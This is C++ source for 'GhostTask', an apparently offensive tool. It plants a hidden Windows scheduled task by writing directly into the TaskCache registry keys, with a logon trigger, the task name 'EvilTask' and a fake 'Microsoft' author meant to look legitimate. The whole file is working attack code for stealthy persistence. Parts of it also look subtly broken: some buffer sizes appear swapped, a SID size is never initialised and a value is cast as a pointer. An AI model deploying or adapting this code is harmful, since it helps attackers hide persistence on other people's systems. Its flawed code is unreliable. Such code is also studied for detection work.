/*
* Title: GhostTask
* Resources:
*	- https://labs.withsecure.com/publications/scheduled-task-tampering
*	- https://github.com/netero1010/GhostTask
*/
#include <Windows.h>
#include <stdio.h>
#include <string>
#include <sddl.h>
#include "GhostTask.hpp"
#pragma comment(lib, "Rpcrt4.lib")

BOOL GhostTask() {
	std::wstring wSchTaskName = L"EvilTask"; // Replace it with arbitrary task name.

	// ------------------------------------------------------------------------ //
	// Generate random GUID for the task.
	// ------------------------------------------------------------------------ //

	GUID guid = { 0 };
	RPC_WSTR wGuidStr = nullptr;
	if (UuidCreate(&guid) != RPC_S_OK) {
		return FALSE;
	}
	if (UuidToStringW(&guid, &wGuidStr) != RPC_S_OK) {
		return FALSE;
	}

	std::wstring wGuid(reinterpret_cast<wchar_t*>(wGuidStr));
	const BYTE* lpGuid = reinterpret_cast<const BYTE*>(wGuid.c_str());

	DWORD dwGuidSize = wGuid.size() * sizeof(wchar_t);

	RpcStringFreeW(&wGuidStr);

	// ------------------------------------------------------------------------ //
	// Generate Security Descriptor
	// ------------------------------------------------------------------------ //

	PSECURITY_DESCRIPTOR pSd;
	ULONG dwSdSize;
	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"O:BAG:SYD:", 1, &pSd, &dwSdSize)) {
		return FALSE;
	}

	// ------------------------------------------------------------------------ //
	// Prepare subkey paths
	// ------------------------------------------------------------------------ //

	std::wstring wSubkeyBase = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\";

	std::wstring wSubkeyPlain = wSubkeyBase + L"Plain\\" + wGuid;
	std::wstring wSubkeyTasks = wSubkeyBase + L"Tasks\\" + wGuid;
	std::wstring wSubkeyTree = wSubkeyBase + L"Tree\\" + wSchTaskName;

	// ------------------------------------------------------------------------ //
	// Create subkey 1. Plain
	// ------------------------------------------------------------------------ //

	HKEY hKeyPlain = nullptr;

	LONG result = RegCreateKeyExW(
		HKEY_LOCAL_MACHINE,
		wSubkeyPlain.c_str(),
		0,
		nullptr,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		nullptr,
		&hKeyPlain,
		nullptr
	);
	if (result != ERROR_SUCCESS) {
		return FALSE;
	}

	RegCloseKey(hKeyPlain);

	// ------------------------------------------------------------------------ //
	// Create subkey 2. Tasks
	// ------------------------------------------------------------------------ //

	HKEY hKeyTasks = nullptr;

	result = RegCreateKeyExW(
		HKEY_LOCAL_MACHINE,
		wSubkeyTasks.c_str(),
		0,
		nullptr,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		nullptr,
		&hKeyTasks,
		nullptr
	);
	if (result != ERROR_SUCCESS) {
		return FALSE;
	}

	// Prepare data.
	std::wstring wAuthor = L"Microsoft"; // Impersonate a legitimate name.
	const BYTE* lpAuthor = reinterpret_cast<const BYTE*>(wAuthor.c_str());
	DWORD dwAuthorSize = wAuthor.size() * sizeof(wchar_t);

	const BYTE* lpSchTaskName = reinterpret_cast<const BYTE*>(wSchTaskName.c_str());
	DWORD dwSchTaskNameSize = wSchTaskName.size() * sizeof(wchar_t);

	std::wstring wDate = L"2021-01-01T00:00:00";
	const BYTE* lpDate = reinterpret_cast<const BYTE*>(wDate.c_str());
	DWORD dwDateSize = wDate.size() * sizeof(wchar_t);

	wchar_t wCmd[256] = { 0 };
	DWORD dwCmdSize = wcslen(wCmd);

	wchar_t wArgument[256] = { 0 };
	DWORD dwArgumentSize = wcslen(wArgument);

	wchar_t wWorkingDirectory[256] = { 0 };
	DWORD dwWorkingDirectorySize = wcslen(wWorkingDirectory);

	Actions* pActions = (Actions*)malloc(sizeof(Actions));
	pActions->version = 0x3;
	pActions->dwAuthorSize = dwAuthorSize;
	memcpy(pActions->author, lpAuthor, pActions->dwAuthorSize);
	pActions->magic = 0x6666;
	pActions->id = 0;
	pActions->dwCmdSize = dwCmdSize;
	pActions->wCmd = wCmd;
	pActions->dwArgumentSize = dwArgumentSize;
	pActions->wArgument = wArgument;
	pActions->dwWorkingDirectorySize = dwWorkingDirectorySize;
	pActions->wWorkingDirectory = wWorkingDirectory;
	pActions->flags = 0;

	BYTE* pActionsRaw = nullptr;
	DWORD dwActionSize;
	dwActionSize = sizeof(SHORT) + sizeof(DWORD) + dwAuthorSize + sizeof(SHORT) + sizeof(DWORD) + sizeof(DWORD) + dwCmdSize + sizeof(DWORD) + dwArgumentSize + sizeof(DWORD) + dwWorkingDirectorySize + sizeof(SHORT);
	pActionsRaw = (BYTE*)malloc(dwActionSize);
	BYTE* ptr = pActionsRaw;
	COPY_DATA(ptr, &pActions->version, sizeof(SHORT));
	COPY_DATA(ptr, &pActions->dwAuthorSize, sizeof(DWORD));
	COPY_DATA(ptr, &pActions->author, pActions->dwAuthorSize);
	COPY_DATA(ptr, &pActions->magic, sizeof(SHORT));
	COPY_DATA(ptr, &pActions->id, sizeof(DWORD));
	COPY_DATA(ptr, &pActions->dwCmdSize, dwCmdSize);
	COPY_DATA(ptr, &pActions->wCmd, sizeof(DWORD));
	COPY_DATA(ptr, &pActions->dwArgumentSize, sizeof(DWORD));
	COPY_DATA(ptr, &pActions->wArgument, dwArgumentSize);
	COPY_DATA(ptr, &pActions->dwWorkingDirectorySize, sizeof(DWORD));
	COPY_DATA(ptr, &pActions->wWorkingDirectory, dwWorkingDirectorySize);
	COPY_DATA(ptr, &pActions->flags, sizeof(SHORT));

	AlignedByte empty;
	empty.value = 0;
	memset(empty.padding, 0, 7);

	AlignedByte enable;
	enable.value = 1;
	memset(enable.padding, 0, 7);

	AlignedByte skipSid;
	skipSid.value = 0;
	memset(skipSid.padding, 0x48, 7);

	AlignedByte skipUser;
	skipUser.value = 1;
	memset(skipUser.padding, 0x48, 7);

	AlignedByte version;
	version.value = 0x17;
	memset(version.padding, 0, 7);

	WCHAR wAccountName[256];
	DWORD dwAccountNameSize = sizeof(wAccountName) / sizeof(wAccountName[0]);
	if (!GetUserNameW(wAccountName, &dwAccountNameSize)) {
		free(pActionsRaw);
		free(pActions);
		return FALSE;
	}
	BYTE wSid[SECURITY_MAX_SID_SIZE];
	DWORD dwSidSize;
	WCHAR wDomainName[256];
	DWORD dwDomainNameSize = sizeof(wDomainName) / sizeof(wDomainName[0]);
	SID_NAME_USE sidType;

	if (!LookupAccountNameW(
		nullptr,
		wAccountName,
		wSid,
		&dwSidSize,
		wDomainName,
		&dwDomainNameSize,
		&sidType
	)) {
		free(pActionsRaw);
		free(pActions);
		return FALSE;
	}

	SYSTEMTIME st;
	GetSystemTime(&st);
	FILETIME ft;
	SystemTimeToFileTime(&st, &ft);
	FILETIME emptyTime;
	emptyTime.dwLowDateTime = 0;
	emptyTime.dwHighDateTime = 0;

	DynamicInfo dynamicInfo;
	dynamicInfo.dwMagic = 0x3;
	dynamicInfo.ftCreate = ft;
	dynamicInfo.ftLastRun = emptyTime;
	dynamicInfo.dwTaskState = 0;
	dynamicInfo.dwLastErrorCode = 0;
	dynamicInfo.ftLastSuccessfulRun = emptyTime;

	TriggerLocal* pTriggerLocal = nullptr;
	pTriggerLocal = (TriggerLocal*)malloc(sizeof(pTriggerLocal) + sizeof(LogonTrigger));

	TSTIME emptyTstime;
	emptyTstime.isLocalized = empty;
	emptyTstime.time = emptyTime;

	LogonTrigger logonTrigger;
	logonTrigger.magic = 0xaaaa;
	logonTrigger.unknown0 = 0;
	logonTrigger.startBoundary = emptyTstime;
	logonTrigger.endBoundary = emptyTstime;
	logonTrigger.delaySeconds = 0;
	logonTrigger.timeoutSeconds = 0xffffffff;
	logonTrigger.repetitionIntervalSeconds = 0;
	logonTrigger.repetitionDurationSeconds = 0;
	logonTrigger.repetitionDurationSeconds2 = 0;
	logonTrigger.stopAtDurationEnd = 0;
	logonTrigger.enabled = enable;
	logonTrigger.unknown1 = empty;
	logonTrigger.triggerId = 0;
	logonTrigger.blockPadding = 0x48484848;
	logonTrigger.skipUser = skipUser;

	UserInfoLocal userInfoLocal;
	userInfoLocal.skipUser = skipUser;
	userInfoLocal.skipSid = skipSid;
	userInfoLocal.sidType = 0x1;
	userInfoLocal.pad0 = 0x48484848;
	userInfoLocal.sizeOfSid = dwSidSize;
	userInfoLocal.pad1 = 0x48484848;
	memcpy(userInfoLocal.sid, wSid, dwSidSize);
	userInfoLocal.pad2 = 0x48484848;
	userInfoLocal.sizeOfUsername = 0;
	userInfoLocal.pad3 = 0x48484848;

	OptionalSettings optSettings;
	optSettings.idleDurationSeconds = 0x258;
	// Default value 1 hour
	optSettings.idleWaitTimeoutSeconds = 0xe10;
	// Default value 3 days
	optSettings.executionTimeLimitSeconds = 0x3f480;
	optSettings.deleteExpiredTaskAfter = 0xffffffff;
	// Default value is 7 BELOW_NORMAL_PRIOPRITY_CLASS
	optSettings.priority = 0x7;
	optSettings.restartOnFailureDelay = 0;
	optSettings.restartOnFailureRetries = 0;
	GUID emptyNetworkId;
	memset(&emptyNetworkId, 0, sizeof(GUID));
	optSettings.networkId = emptyNetworkId;
	optSettings.pad0 = 0x48484848;

	JobBucketLocal jobBucketLocal;
	jobBucketLocal.flags = 0x42412108;
	jobBucketLocal.pad0 = 0x48484848;
	jobBucketLocal.crc32 = 0;
	jobBucketLocal.pad1 = 0x48484848;
	jobBucketLocal.sizeOfAuthor = 0xe;
	jobBucketLocal.pad2 = 0x48484848;
	memcpy(jobBucketLocal.author, lpAuthor, 12);
	jobBucketLocal.pad3 = 0x48480000;
	jobBucketLocal.displayName = 0;
	jobBucketLocal.pad4 = 0x48484848;
	jobBucketLocal.userInfoLocal = userInfoLocal;
	jobBucketLocal.sizeOfOptionalSettings = 0x2c;
	jobBucketLocal.pad5 = 0x48484848;
	jobBucketLocal.optionalSettings = optSettings;

	Header header;
	header.version = version;

	pTriggerLocal->header = header;
	pTriggerLocal->jobBucketLocal = jobBucketLocal;
	memcpy(pTriggerLocal->trigger, &logonTrigger, sizeof(LogonTrigger));

	// Set values.
	if (RegSetValueExW(hKeyTasks, L"Author", 0, REG_SZ, lpAuthor, dwAuthorSize) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTasks, L"Path", 0, REG_SZ, lpSchTaskName, dwSchTaskNameSize) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTasks, L"URI", 0, REG_SZ, lpSchTaskName, dwSchTaskNameSize) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTasks, L"Date", 0, REG_SZ, lpDate, dwDateSize) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTasks, L"Actions", 0, REG_SZ, pActionsRaw, dwActionSize) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTasks, L"DynamicInfo", 0, REG_BINARY, (LPBYTE)&dynamicInfo, sizeof(dynamicInfo)) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTasks, L"Triggers", 0, REG_BINARY, (LPBYTE)pTriggerLocal, sizeof(pTriggerLocal) + sizeof(LogonTrigger)) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}

	RegCloseKey(hKeyTasks);

	// ------------------------------------------------------------------------ //
	// Create subkey 3. Tree
	// ------------------------------------------------------------------------ //

	HKEY hKeyTree;

	result = RegCreateKeyExW(
		HKEY_LOCAL_MACHINE,
		wSubkeyTree.c_str(),
		0,
		nullptr,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		nullptr,
		&hKeyTree,
		nullptr
	);
	if (result != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}

	// Prepare data.
	LONGLONG index = 3;

	if (RegSetValueExW(hKeyTree, L"Index", 0, REG_DWORD, (LPBYTE)index, 4) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTree, L"Id", 0, REG_SZ, lpGuid, dwGuidSize) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}
	if (RegSetValueExW(hKeyTree, L"SD", 0, REG_BINARY, (LPBYTE)pSd, dwSdSize) != ERROR_SUCCESS) {
		free(pActionsRaw);
		free(pActions);
		free(pTriggerLocal);
		return FALSE;
	}

	RegCloseKey(hKeyTree);

	free(pActionsRaw);
	free(pActions);
	free(pTriggerLocal);

	return TRUE;
}

int main() {
	GhostTask();
	return 0;
}